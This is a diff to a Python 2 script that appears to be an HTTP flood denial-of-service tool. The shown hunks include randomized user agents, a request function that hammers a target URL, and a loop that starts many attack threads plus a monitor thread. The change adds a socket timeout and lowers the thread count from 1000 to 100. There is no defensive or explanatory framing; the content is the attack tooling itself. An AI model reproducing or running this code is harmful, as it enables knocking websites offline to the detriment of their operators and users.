@@ -1,8 +1,13 @@
+#!/usr/bin/env python
+# coding: utf-8
+
 import urllib2
 import threading
 import random
 import re
 import sys
+import socket
+socket.setdefaulttimeout(2)
 #global params
 url=''
 host=''
@@ -23,7 +28,7 @@ def set_flag(val):
 def set_safe():
     global safe
     safe=1
-    
+
 # generates a user agent array
 def useragent_list():
     global headers_useragents
@@ -95,9 +100,9 @@ def httpcall(url):
     else:
             inc_counter()
             urllib2.urlopen(request)
-    return(code)        
+    return(code)
 
-#http caller thread 
+#http caller thread
 class HTTPThread(threading.Thread):
     def run(self):
         try:
@@ -137,7 +142,7 @@ else:
             url = url + "/"
         m = re.search('http\://([^/]*)/?.*', url)
         host = m.group(1)
-        for i in range(1000):
+        for i in range(100):
             t = HTTPThread()
             t.start()
         t = MonitorThread()
